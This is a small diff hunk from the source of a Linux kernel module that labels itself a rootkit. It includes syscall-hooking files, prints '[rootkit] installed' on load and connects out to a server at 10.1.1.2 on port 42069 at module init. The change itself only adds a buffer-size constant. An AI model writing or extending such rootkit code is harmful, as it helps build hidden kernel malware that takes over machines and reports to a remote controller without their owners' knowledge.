@@ -10,6 +10,8 @@ kernel module imports
 #include <custom/hooks.c> //functions for hooking syscalls
 #include <custom/hooked_syscalls.c> //functions of the hooked syscalls
 
+#define BUFFER_SIZE 1024 //size of buffers used
+
 static int __init ModuleInit(void) {
   printk(KERN_DEBUG "[rootkit] installed\n"); //DEBUG //DEBUG logs to dmesg
   server_connect("10.1.1.2", 42069);
